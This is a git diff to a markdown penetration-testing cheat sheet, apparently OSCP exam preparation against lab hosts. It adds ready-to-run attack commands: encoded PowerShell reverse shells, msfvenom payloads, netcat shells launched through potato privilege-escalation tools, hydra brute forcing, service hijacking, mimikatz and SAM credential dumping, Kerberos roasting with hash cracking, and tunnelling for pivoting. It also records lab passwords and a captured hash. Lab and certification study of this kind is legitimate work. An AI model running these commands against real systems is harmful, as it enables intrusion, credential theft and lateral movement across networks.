@@ -62,20 +62,23 @@
 - check for activedirectory info
 
 ### Initial enumeration
-- scan common ports on machines in the external network, `-p-` for all ports, also scan UDP
+- scan common ports on machines in the external network, `-p-` for all ports, also scan UDP, scan for basic vulnerabilities
+- fingerprint webservices
+	- make note of http titles as well, could help identify cms/plugins etc
+	- find inputs for sql injection/command injection
+	- find file uploads
+	- find file params for LFI RFI
 ```bash
 nmap 192.168.248.225
 sudo nmap -sU --open -p 161 192.168.248.225
 sudo nmap -p- -Pn 192.168.248.225 -sS -T 5 --verbose
 nmap -sT -A -p 80,8090 192.168.248.225
-```
-- fingerprint webservices
-	- make note of http titles as well, could help identify cms/plugins etc
-```
 nikto -host 192.168.248.225 -port 8090
 sudo nmap -sV -p 8090 --script "vuln" 192.168.248.225
+sudo nmap -O 192.168.211.150 --osscan-guess
 ```
 - run whatweb for CMS identification
+	- with fingerprinting/cms info find CVEs for those technologies or CMS vulnerabilities (plugins etc)
 ```bash
 whatweb 192.168.248.225:8090
 ```
@@ -86,26 +89,107 @@ whatweb 192.168.248.225:8090
 ```
 gobuster dir -u http://192.168.248.225:8090 -w /usr/share/wordlists/dirb/big.txt
 feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.248.225:8090
+
+gobuster dir -u http://192.168.229.199:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf
+
 exiftool -a -u info.pdf
 ```
-- look for initial foothold
-	- find inputs for sql injection/command injection
-	- find file uploads
-	- find file params for LFI RFI
-	- with fingerprinting/cms info find CVEs for those technologies or CMS vulnerabilities (plugins etc)
-	- check smb, smtp, snmp, ftp
-- searchsploit AND google for services, pprts and exploits
+- Enumerate any other open ports (SMB, VNC, SNMP, msql, ftp etc)
+```bash
+# enumerate vnc
+nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900 192.168.240.220
+hydra -s 5900 -P /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt -t 16 192.168.240.220 vnc
+vncviewer 192.168.229.220::5901
+
+# enumerate smb
+enum4linux 192.168.240.220
+nmap -v -p 139,445 --script smb-os-discovery 192.168.240.220
+nmap --script=smb-enum* --script-args=unsafe=1 -T5 192.168.194.147
+smbclient -L 192.168.186.220 -U skylark
+smbmap -H 192.168.240.220
+
+# enumerate ftp
+nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.194.147
+# format of wordlist is user:password, so use -C option
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.211.149 ftp
+# source /usr/share/sparta/wordlists/ftp-default-userpass.txt 
+hydra -s 21 -C ftp-wordlist.txt 192.168.211.149 ftp
+
+# enumerate snmp
+sudo apt-get install snmp-mibs-downloader
+snmp-check 192.168.211.149 -c public
+snmpwalk -c public -v1 -t 10 192.168.211.149
+snmpwalk -c public -v2c -t 10 192.168.211.149
+# get passwords
+snmpwalk -c public -v1 -t 10 192.168.211.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
+nmap --script "snmp* and not snmp-brute" 192.168.211.149
+```
+- searchsploit AND google for services, ports and exploits
+```bash
+# searchsploit example
+searchsploit -m 47799
+python3 47799.py 192.168.190.151 whoami 
+
+# prepare encoded powershell command to catch shell
+python3 47799.py 192.168.190.151 "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMwA0ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+```
 - LFI, RFI and directory traversal are all separate things, and are tested separately
 - check for SMB hash attack via url params
+```
+# from target hit our smb server
+ copy \\192.168.45.219\smb\test.txt
+ 
+# use responder or impacket to catch NTLM
+sudo impacket-smbserver -smb2support smb smb
+sudo responder -I tun0
+```
 
+### Generating shells
+```bash
+# this produces shell code
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.234 LPORT=22 -f sh -o shell.sh
+
+# this produces a bash one-liner
+msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.234 LPORT=4444 -f raw -o shell.sh
+
+# Generate dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.181 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll 
+
+```
 ### Windows privesc
 - check if access to internal network
 - run winpeas for initial overview of system
 - look for Se privs
 	- if impersonate, try to use printSpoofer or one of the potatos
+```bash
+whoami /priv
+
+# EFS potato
+iwr -uri http://192.168.45.234/efspotato.cs -Outfile efspotato.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
+
+iwr -uri http://192.168.45.234/nc.exe -Outfile nc.exe
+
+.\efspotato.exe whoami
+.\efspotato.exe "nc.exe 192.168.45.234 5555 -e cmd"
+
+# printspoofer
+iwr -uri http://192.168.45.242/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+.\PrintSpoofer64.exe -i -c powershell.exe
+
+# GodPotato
+iwr -uri http://192.168.45.219/godpotato.exe -Outfile god.exe
+iwr -uri http://192.168.45.219/nc.exe -Outfile nc.exe
+
+.\god.exe -cmd "cmd /c whoami"
+.\god.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.219 9999"
+```
 - check user groups and privs
 - look for other users and other groups
 - look for hidden files that may contain passwords
+```bash
+Get-ChildItem -Path C:\staging\htdocs -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.conf,*.conf.bak -File -Recurse -ErrorAction SilentlyContinue
+```
 - look for odd running programs 
 	- do they have write access? (use icacls)
 	- do they have ddls?
@@ -113,6 +197,30 @@ exiftool -a -u info.pdf
 	- can they be started/stopped
 	- can use powerup to verify we can replace programs
 	- unquoted service paths
+```bash
+# get programs and perms (want F or C or even M)
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+icacls C:\Services\EnterpriseService.exe
+
+# get scheduled tasks
+Get-ScheduledTask
+schtasks /query /fo LIST /v
+schtasks.exe /query /V /FO CSV | convertfrom-csv | where{$_.'Run as user' -match 'roy'} | select taskname
+
+# Unquoted services
+icacls "C:\"
+icacls "C:\Enterprise Software"
+icacls "C:\Enterprise Software\Monitoring Solution" # has write
+icacls "C:\Enterprise Software\Monitoring Solution\Surveillance Apps"
+iwr -uri http://192.168.45.181/adduser.exe -Outfile Surveillance.exe
+copy .\Surveillance.exe 'C:\Enterprise Software\Monitoring Solution\Surveillance.exe'
+Restart-Service ReynhSurveillance 
+net user
+
+# missing DLL
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.181 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll 
+iwr -uri http://192.168.45.219:8000/EnterpriseServiceOptional.exe -Outfile EnterpriseServiceOptional.exe
+```
 - look for scheduled tasks
 - check powershell history for secrets
 - check for presence of keepass and .kdbx files
@@ -141,7 +249,7 @@ exiftool -a -u info.pdf
 
 ### Pivoting
 - use found credentials
-	- spray with crackmapexec smb
+	- spray with crackmapexec smb (use --local-auth if not a domain user)
 	- use crowbar to test RDP access
 - if creds are a match, gain shell
 	- if port 5986/5985 - winrm, evil-winrm
@@ -151,18 +259,215 @@ exiftool -a -u info.pdf
 - check all open ports and services including smtp, ftp, smb, webservers, rdp, ssh
 - double check high ports
 - if we have mail server creds we may be able to phish
+- pivoting with obtained creds:
+```bash
+# smb
+crackmapexec smb 10.10.76.13 -u backup_service -p It4Server --continue-on-success
+impacket-smbexec sql_svc:Dolphin1@10.10.80.148
+smbclient -L //10.10.80.148/ -U sql_svc --password=Dolphin1
+# get a shell
+crackmapexec smb  172.16.104.30 -u Administrator -p admin-password.txt -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
 
+# winrm
+crackmapexec winrm 10.10.76.13 -u backup_service -p It4Server --continue-on-success
+evil-winrm -i 10.10.80.148 -u sql_svc -p "Dolphin1"
+
+# pass the hash
+impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@10.10.76.13 
+
+# rdp
+crowbar -b rdp -s 10.10.80.148/32 -u sql_svc -c "Dolphin1" -n 1
+
+# mssql
+crackmapexec mssql -d oscp.exam -u sql_svc -p 'Dolphin1' -X "whoami" 10.10.80.148
+impacket-mssqlclient sql_svc:Dolphin1@10.10.80.148 -windows-auth
+```
+- tunneling to pivot with chisel (also for accessing internal web server)
+```bash
+# try to access internal web server running at 127.0.0.1:8000
+chisel server --port 8081 --reverse
+sudo tcpdump -nvvvXi tun0 tcp port 8081
+wget http://192.168.45.234/chisel -O chisel
+
+# access the internal webpage at 127.0.0.1:8001 - actually cannot access the webpage but the exploit will still work
+./chisel
+```
+- tunneling to pivot with ligolo (and double pivot)
+```bash
+# from kali
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+# from proxy on kali
+>> session
+>> start
+
+# add route to internal network
+sudo ip route add 172.16.104.0/24 dev ligolo
+
+# check route
+ip route
+
+# delete old routes
+sudo ip route del 172.16.78.0/24 dev ligolo
+
+# from windows target
+iwr -uri http://192.168.45.219:8000/agent.exe -Outfile agent.exe
+./agent.exe -ignore-cert -connect 192.168.45.219:11601
+
+# linux version
+wget http://192.168.45.229/agent -O agent
+chmod +x agent
+# connect to the first machine we proxied to from kali
+./agent -connect 192.168.194.221:11601 -ignore-cert
+
+# double pivot
+# add listener to ligolo
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+
+# download agent on the second machine and connect to first machine
+wget http://192.168.45.229/agent -O agent
+chmod +x agent
+./agent -connect 192.168.194.221:11601 -ignore-cert
+
+# from kali
+session
+# switch to newly added session
+
+# add route to access
+sudo ip route add 10.20.119.0/24 dev ligolo
+```
+- simple port forward if you can't download files on one machine due to restricted network
+```bash
+# listening socket then forwarding socket, then ssh server - run this from kali to forward port 4444 on kali to a new port 4444 on web svc. sql service can only talk to web service, but not kali
+ssh -N -R 4444:127.0.0.1:4444 web_svc@192.168.220.147
+```
 ### Active Directory 
 - user powerview to gain more info on domain users
 - determine if service accounts (iis_service) have higher privs
 - look at domain shares
 - look at user acls
 
-### Post exploition
+### Post exploition (windows)
 - determine if domain joined, if so run bloodhound to gather data as soon as possible
 	-  this can determine if we can do kerb or aspreproasting on certain users
 	- determine who are the domain users
 	- determine shortest path to domain controller
 	- see who has active sessions
+```bash
+# collect data from windows
+powershell -ep bypass
+.\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+
+# transfer to kali
+net use \\192.168.45.242\smb
+copy 20231114113128_BloodHound.zip \\192.168.45.242\smb
+
+# analyze on kali
+sudo neo4j start
+bloodhound
+```
 - mimikatz to gain NTLM hashes
+```bash
+iwr -uri http://192.168.45.217:8000/mimikatz.exe -Outfile mimikatz.exe
+. .\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::cache 
+token::elevate
+lsadump::sam
+
+# oneliner (if using evil-winrm)
+./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "exit" >> mm.txt
+
+# crack hash or use it in pass-the-hash
+hashcat -m 1000 joe.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
 - look for hidden kdbx, passwords in files when you are higher priv
+```bash
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+# copy to kali and extract master password, which we can use to login and obtain more passwords
+net use \\192.168.45.219\smb
+copy Database.kdbx \\192.168.45.219\smb
+
+keepass2john Database.kdbx > keepass2.hash
+hashcat -m 13400 keepass2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+# got password - mercedes1
+kpcli --kdb=/home/kali/relia/Database2.kdbx
+cd /Database/General
+show 0
+```
+- Obtain sam files (windows) and extract hashes
+```bash
+# look for SAM files
+%SYSTEMROOT%\repair\SAM  
+%SYSTEMROOT%\System32\config\RegBack\SAM  
+%SYSTEMROOT%\System32\config\SAM  
+%SYSTEMROOT%\repair\system  
+%SYSTEMROOT%\System32\config\SYSTEM  
+%SYSTEMROOT%\System32\config\RegBack\system  
+
+# found in %SYSTEMROOT%\System32\config\SAM  
+# cannot extract hashes however
+cd C:\Windows\System32\config
+download SAM
+download SYSTEM
+reg save hklm\sam C:\Users\Administrator\sam
+reg save hklm\system C:\Users\Administrator\system
+pypykatz registry --sam sam system
+impacket-secretsdump -sam sam -system system
+impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
+```
+- as-rep roasting
+	- can use impacket or rubeus to gain NTLM hashes
+	- can determine this from bloodhound results
+```bash
+# if you have DC IP
+impacket-GetNPUsers -dc-ip 192.168.214.14  -request -outputfile hashes.asreproast relia.com/jim
+
+# determine if we can as-rep roast any users
+wget https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1
+
+iwr -uri http://192.168.45.219:8000/PowerView.ps1 -Outfile PowerView.ps1
+powershell -ep bypass
+Import-Module .\PowerView.ps1
+Get-DomainUser -PreauthNotRequired
+Get-Module -ListAvailable
+
+# try on windows host with rubeus
+wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
+
+iwr -uri http://192.168.45.219:8000/Rubeus.exe -Outfile Rubeus.exe
+
+.\rubeus.exe asreproast /nowrap
+
+# get michelle's hash
+$krb5asrep$michelle@relia.com:79E53520A15B4689C962B90611570895$E09A752854E0E23F3914E16104862DF7B85A8A81D2BFFA8DC46E3498BEAF98A069DC1979D1D268557C94DF38694A74A2A50460D72A9EE764FECF6D0E8CCBCAC1FC80578D714D7C291B587D1A10624957034C22FFDA35698560ED92A6B280CF74F169F38C03EE4C86406205CE07CA06498B7FDC2B1CA843BC43E2C8BEA4055F3CD5502FB1B3A64529360335CDE731C59357928AF4595D833636BC5C5046B385C0BFD3048BBE8AE7EC07BA301CBEB32FF64F57FC0C5E41A9AF5A407BD6CB1BEEEB0DF59EDC5B7FD64B44CA53B5BD20FB451ABF5CECB19A2EE07BDC10E917AFD4B0976D55D0F665
+
+# save to file michelle.hash - get NotMyPassword0k?
+sudo hashcat -m 18200 michelle.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+- kerberoasting
+	- also gain this from bloodhound results
+```bash
+iwr -uri http://192.168.45.219/Rubeus.exe -Outfile Rubeus.exe
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+copy hashes.kerberoast \\192.168.45.219\smb
+
+# crack the hash
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r rule1 --force
+
+```
+- find passwords on the filesystem
+```
+Get-ChildItem -Path C:\Users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Post exploitation (linux)
+- Find passwords on filesystem
+```bash
+grep --color=auto -rnw '/home/archive' -iIe "PASSWORD" --color=always 2>/dev/null
+```
